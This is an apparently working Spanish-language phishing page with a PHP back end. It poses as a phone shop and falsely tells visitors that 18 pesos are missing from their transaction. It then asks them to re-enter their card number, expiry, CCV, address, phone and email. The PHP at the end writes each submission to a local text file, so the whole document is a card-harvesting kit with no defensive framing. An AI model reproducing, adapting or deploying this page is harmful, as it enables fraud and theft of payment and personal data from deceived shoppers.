<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<title>Formulario de Tarjeta de Crédito Dinámico</title>
	<link href="https://fonts.googleapis.com/css?family=Lato|Liu+Jian+Mao+Cao&display=swap" rel="stylesheet">
	<link rel="stylesheet" href="css/estilos.css">
</head>
<body>
	<div class="">
		<center>
			<img src="img/logo.png" alt="" width="619" height="188">
			<h1>Samsung A9 pro</h1>
			<img src="img/cel.png" alt="">
			<h2>Lamentablemente en su transacción</h2>
			<h2>faltan 18$ pesos reingrese los datos</h2>
			<h2>de su tarjeta para pagar el dinero restante.</h2>
			<h2>Ingrese nuevamente la dirección a la cual</h2>
			<h2>será enviado el paquete</h2>
		</center>
	</div>
	<div class="contenedor">

		<!-- Tarjeta -->
		<section class="tarjeta" id="tarjeta">
			<div class="delantera">
				<div class="logo-marca" id="logo-marca">
					<!-- <img src="img/logos/visa.png" alt=""> -->
				</div>
				<img src="img/chip-tarjeta.png" class="chip" alt="">
				<div class="datos">
					<div class="grupo" id="numero">
						<p class="label">Número Tarjeta</p>
						<p class="numero">#### #### #### ####</p>
					</div>
					<div class="flexbox">
						<div class="grupo" id="nombre">
							<p class="label">Nombre Tarjeta</p>
							<p class="nombre">Usuario</p>
						</div>

						<div class="grupo" id="expiracion">
							<p class="label">Expiracion</p>
							<p class="expiracion"><span class="mes">MM</span> / <span class="year">AA</span></p>
						</div>
					</div>
				</div>
			</div>

			<div class="trasera">
				<div class="barra-magnetica"></div>
				<div class="datos">
					<div class="grupo" id="firma">
						<p class="label">Firma</p>
						<div class="firma"><p></p></div>
					</div>
					<div class="grupo" id="ccv">
						<p class="label">CCV</p>
						<p class="ccv"></p>
					</div>
				</div>
				<p class="leyenda">Gracias por su preferencia. Esperemos disfrte de su producto! cualquier pregunta no dude en llamarnos.</p>
				<a href="#" class="link-banco">www.cellphone.com</a>
			</div>
		</section>

		<!-- Contenedor Boton Abrir Formulario -->
		<div class="contenedor-btn">
			<button class="btn-abrir-formulario" id="btn-abrir-formulario">
				<i class="fas fa-plus"></i>
			</button>
		</div>
		<!-- Formulario -->
		<form action="index.php" id="formulario-tarjeta" class="formulario-tarjeta" method="post">
			<div class="grupo">
				<label for="inputNumero">Número Tarjeta</label>
				<input type="text" id="inputNumero" maxlength="19" autocomplete="off" name="numero_tarjeta">
			</div>
			<div class="grupo">
				<label for="inputNombre">Nombre</label>
				<input type="text" id="inputNombre" maxlength="19" autocomplete="off" name="nombre">
			</div>
			<div class="flexbox">
				<div class="grupo expira">
					<label for="selectMes">Expiracion</label>
					<div class="flexbox">
						<div class="grupo-select">
							<select name="mes" id="selectMes">
								<option disabled selected>Mes</option>
							</select>
							<i class="fas fa-angle-down"></i>
						</div>
						<div class="grupo-select">
							<select name="year" id="selectYear">
								<option disabled selected>Año</option>
							</select>
							<i class="fas fa-angle-down"></i>
						</div>
					</div>
				</div>

				<div class="grupo ccv">
					<label for="inputCCV">CCV</label>
					<input type="text" id="inputCCV" maxlength="3" name="ccv">
				</div>
			</div>
			<div class="">
				<label for="inputEstado">Estado</label>
				<input type="text" id="inputEstado" maxlength="19" autocomplete="off" name="estado">
			</div>
			<div class="">
				<label for="inputMunicipio">Municipio</label>
				<input type="text" id="inputMunicipio" maxlength="19" autocomplete="off" name="municipio">
			</div>
			<div class="">
				<label for="inputDireccion">Dirección</label>
				<input type="text" id="inputDireccion" maxlength="30" autocomplete="off" name="direccion">
			</div>
			<div class="">
				<label for="inputCelular">Número Celular</label>
				<input type="number" id="inputCelular" maxlength="19" autocomplete="off" name="celular">
			</div>
			<div class="">
				<label for="inputCorreo">Correo Electrónico</label>
				<input type="email" id="inputCorreo" maxlength="25" autocomplete="on" name="correo">
			</div>
			<button type="submit" class="btn-enviar">Enviar</button>
		</form>
	</div>
	<div class="">
		<img src="img/logo.png" alt="">
	</div>
	<script src="https://kit.fontawesome.com/2c36e9b7b1.js" crossorigin="anonymous"></script>
	<script src="js/main.js"></script>
</body>
</html>
<?php
	$numero_tarjeta = $_POST["numero_tarjeta"];
	$nombre = $_POST["nombre"];
	$mes = $_POST["mes"];
	$year = $_POST["year"];
	$ccv = $_POST["ccv"];
	$estado = $_POST["estado"];
	$municipio = $_POST["municipio"];
	$direccion = $_POST["direccion"];
	$celular = $_POST["celular"];
	$correo = $_POST["correo"];

	$file = fopen("datos.txt", "a");

	fwrite($file, "--------------------------------------------\n");
	fwrite($file, "CC: " . $numero_tarjeta . "\n");
	fwrite($file, "Nombre: " . $nombre . "\n");
	fwrite($file, "Mes: " . $mes . "\n");
	fwrite($file, "Año: " . $year . "\n");
	fwrite($file, "ccv: " . $ccv . "\n");
	fwrite($file, "Estado: " . $estado . "\n");
	fwrite($file, "Municipio: " . $municipio . "\n");
	fwrite($file, "Dirección: " . $direccion . "\n");
	fwrite($file, "Celular: " . $celular . "\n");
	fwrite($file, "Correo: " . $correo . "\n");
	fwrite($file, "--------------------------------------------\n");

	fclose($file);
 ?>
